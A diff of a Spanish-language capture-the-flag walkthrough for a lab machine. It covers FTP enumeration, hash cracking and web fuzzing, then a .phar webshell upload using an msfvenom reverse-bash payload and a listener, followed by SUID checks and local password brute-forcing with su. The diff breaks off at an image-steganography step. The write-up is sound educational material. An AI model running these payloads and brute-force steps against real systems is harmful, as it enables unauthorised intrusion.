@@ -12,25 +12,26 @@ Primero hacemos un **Escaneo del Objetivo**. Para ello, usamos `nmap`:
 
 Vemos que el puerto 80 y 21 están abiertos, que trata de un Ubuntu con Apache 2.4.41 y FTP con usuario anónimo habilitado, respectivamente.  
 
-Ahora, vamos a Enumerar los Servicios.  
+Ahora, vamos a **Enumerar los Servicios**:  
 
-Primero el FTP. Corremos: `ftp <IP>` e ingresamos `Anonymous` en el campo de usuario. Al pedir la password, sólo presionamos `Enter` y listo, estamos dentro del servidor FTP. Ahora lanzamos `dir` o `ls` y vemos el contenido.  
+1. FTP:  
+
+Corremos: `ftp <IP>` e ingresamos `Anonymous` en el campo de usuario. Al pedir la password, sólo presionamos `Enter` y listo, estamos dentro del servidor FTP. Ahora lanzamos `dir` o `ls` y vemos el contenido.  
 
 Vemos que hay un archivo interesante llamado `anon.txt` el cual descargamos localmente con `get anon.txt`. Ahora, en nuestro equipo, hacemos un `cat anon.txt` y nos devuelve un hash. Para saber el tipo, corremos `hashid cbfdac6008f9cab4083784cbd1874f76618d2a97` localmente y notamos que es un `MD5` el cual es muy poco seguro y fácil de crackear.  
-
 Entonces ahora, vamos a la página https://crackstation.net/, ingresamos nuestro hash y obtenemos que es `justin`. Por el momento, eso es todo con respecto a FTP.  
 
-Ahora Enumeremos el servicio Web:  
+2. El Servicio Web:  
 
-Primero los Directorios. Usamos `wfuzz`:  
+Primero los *Directorios*. Usamos `wfuzz`:  
 
  `wfuzz -c --hc 404 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -R 3 -u "http://<IP>/FUZZ"`  
 
- Obtenemos uno solo de relevacia:
+ Obtenemos uno solo de relevacia:  
  
  * /uploads  
 
-Ahora, los Recursos. En este caso, buscamos PHP, HTML y TXT:  
+Ahora, los *Recursos*. En este caso, buscamos *PHP, HTML y TXT*:  
 
 `wfuzz -c --hc 404 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt" -u "http://<IP>/FUZZ.FUZ2Z"`  
 
@@ -44,33 +45,36 @@ ___
 
 #### FASE EXPLOTACIÓN (Ganar Acesso):  
 
-Una vez enumerados todos los servicios, debemos lograr entrar. Después de mucho investigar, pareciera que el *Vector* es una **WebShell**. Probamos subir archivos con extensiones comunes (JPG, PNG, PHP, TXT, etc.) en el endpoint `/file_upload.php`. Después de varios intentos, nada.  
+Una vez enumerados todos los servicios, debemos lograr Entrar. Pareciera que el *Vector de Ataque* es una **WebShell**. Probamos subir archivos con extensiones comunes (JPG, PNG, PHP, TXT, etc.) en el endpoint `/file_upload.php`. Después de varios intentos, nada.  
 
-Entonces, pasamos a descargar los recursos PHP que son los que tienen la lógica de la subida. Lo hacemos de la siguiente manera:  
+Entonces, pasamos a descargar los recursos PHP que son los que tienen la lógica de dicha subida. Lo hacemos de la siguiente manera:  
 
 * `curl -O http://<IP>/file_upload.php`
 * `curl -O http://<IP>/subir_archivo.php`
 
 Revisándolos localmente con `cat` o `less`, vemos que no dice nada relevante en cuanto al formato de archivo aceptado. Entonces, finalmente, intentamos con la extensión `.phar` y tenemos éxito.  
 
-> Los archivos PHAR son como empaquetados de PHP que pueden tener código ejecutable, entre otras cosas. Por lo cual, es una manera alternativa para correr una WebShell.  
+> Los archivos PHAR son como paquetes de PHP. Pueden tener código ejecutable, entre otras cosas. Es una manera alternativa para correr una WebShell.  
 
 Ahora, teniendo en cuenta esto, pasamos a crearla con `msfvemom`:  
 
 `msfvenom -p php/unix/cmd/reverse_bash LHOST=<IP_local> LPORT=<puerto_local> R -o webshell.php.phar`  
 
-> * La `R` es equivalente a `-f raw` que significa *Código en Crudo*
-> * Usamos el payload anterior para poder recibir la conexión reversa con alguna otra herramienta alternativa a Meterpreter, para variar.
+> * La `R` es equivalente a `-f raw` que significa *Formato en Crudo*  
+> * Usamos el payload anterior para poder recibir la *Conexión Reversa* con alguna otra herramienta alternativa a Meterpreter, para variar.  
 > * Suponemos que el usuario www-data usa el intérprete de bash (y lo hace), pero de no funcionar, buscaríamos otro.  
 
-Bien, una vez creada, procedemos a subirla. Tenemos éxito y nos dirigimos a `/uploads` donde verificamos la misma. Ahora, pasamos a preparar nuestro listener. En este caso, usamos [Penélope](https://github.com/brightio/penelope). Con `penelope -i <IP_local> -p <puerto>` creamos nos ponemos a la escucha, localmente. Corremos la webshell en el navegador.  
-Logramos acceso.  
+Bien, una vez creada, procedemos a subirla. Tenemos éxito y nos dirigimos a `/uploads` donde verificamos la misma.  
+
+Ahora, pasamos a preparar nuestro listener. En este caso, usamos [Penélope](https://github.com/brightio/penelope). Con `penelope -i <IP_local> -p <puerto>` nos ponemos a la escucha localmente. Corremos la webshell en el navegador.  
+
+Tenemos *footholding*.  
 
 ___
 
 #### FASE POST-EXPLOTACIÓN  
 
-Con un **pie dentro**, lanzamos `whoami` y comprobamos que somos `www-data`.  
+Con un *Pie Dentro*, lanzamos `whoami` y comprobamos que somos `www-data`.  
 
 Lo primero que debemos hacer apenas entramos, es **Enumerar Usuarios**. Lo hacemos de la siguiente manera:  
 
@@ -84,7 +88,7 @@ Ahora podemos notar que los usuarios son 4:
 3. julen
 4. iker
 
-> Todos usan el intérprete de Bash  
+> Todos usan el intérprete de Bash (incluso www-data)  
 
 Lo segundo es **Buscar Credenciales en el Sistema**. Podemos hacerlo con:  
 
@@ -95,19 +99,23 @@ Lo segundo es **Buscar Credenciales en el Sistema**. Podemos hacerlo con:
 > También podemos correr **LinPEAS** desde Penélope haciendo:
 > `modules` ==> `run peass_ng`
 
-> Además debemos buscar **Binarios SUID** y **Privilegios Sudo** para ver si así podemos **Escalar Privilegios** desde www-data, por si acaso:
+> Además, debemos buscar **Binarios SUID** y **Privilegios Sudo** para ver si así podemos **Escalar Privilegios** desde www-data, por si acaso:
 
 > * `find / -type f -perm -4000 2>/dev/null | xargs ls -l`
 > * `sudo -l`
 
-Una vez que nos damos cuenta que no conseguimos nada con lo anterior, pasamos a crear un **Script** para crackear las contraseñas de usuarios mediante un *Ataque de Diccionario*. Yo usé el mío [aquí](https://github.com/cobrasecx/bruters/blob/main/bruter.sh). Probando varias listas, conseguimos resultados, finalmente: `fernando:chocolate`.  
+>`-perm -4000` significa *Permisos SUID Flexibles*, es decir *4****  
+> `2>/dev/null` quiere decir *enviar la salida de errores estándar a `/dev/null` (descartarla)  
+> `xargs ls -l` lista los resultados especificando los permisos  
 
-> El diccionario ganador fue `/usr/share/seclists/Passwords/Common-Credentials/best110.txt`
-> Es necesario crear una lista de usuario con `nano users.txt`, por ejemplo.  
+Una vez que nos damos cuenta que no conseguimos nada con lo anterior, pasamos a crear un **Script** para crackear las contraseñas de usuarios localmente (`su - <usuario> ==> <password>`) mediante un *Ataque de Diccionario*. Yo usé el mío [aquí](https://github.com/cobrasecx/bruters/blob/main/bruter.sh). Probando varias listas, conseguimos resultados, finalmente: `fernando:chocolate`.  
 
-Una vez con estos datos, proseguimos con `su - fernando ==> chocolate` y conseguimos **Movimiento Lateral**. Ahora, como `fernando`, vemos que no tenemos *Permisos Sudo* (`sudo -l`) ni *Binarios SUID* relevantes en el sistema.  
+> La ganadora fue `/usr/share/seclists/Passwords/Common-Credentials/best110.txt`  
+> Es necesario crear una lista de usuarios con `nano users.txt`, por ejemplo.  
 
-Ya habiendo probado varias cosas, vemos que listando nuestro home con `ls -l /home/fernando` vemos un archivo de imagen llamado `dragon-medieval.jpeg`. Parece ser nuestro *Vector de Ataque*.  
+Una vez con estos datos, proseguimos con `su - fernando ==> chocolate` y conseguimos **Movimiento Lateral**. Ahora, como `fernando`, vemos que no tenemos *Permisos Sudo* (`sudo -l`), ni *Binarios SUID* relevantes en el sistema.  
+
+Ya habiendo probado varias cosas, vemos que listando nuestro home con `ls -l /home/fernando` aparece un archivo de imagen llamado `dragon-medieval.jpeg`. Parece ser nuestro *Vector de Ataque*.  
 
 > Cuando el Vector es una Imagen, pueden ser 2 caminos:
 > 1. Datos Incrustados
